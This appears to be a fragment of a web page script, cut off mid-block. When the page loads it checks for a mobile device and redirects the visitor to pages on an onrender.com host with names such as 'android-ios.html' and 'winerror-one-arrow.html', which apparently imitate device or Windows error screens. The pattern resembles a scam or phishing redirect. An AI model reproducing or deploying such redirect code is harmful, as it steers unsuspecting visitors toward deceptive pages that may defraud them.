    }

    document.addEventListener("DOMContentLoaded", function () {
      if (isMobileDevice()) {

        window.location.href = "https://multi-i1iu.onrender.com/android-ios.html";

        window.location.href = "https://multi-i1iu.onrender.com/winerror-one-arrow.html";
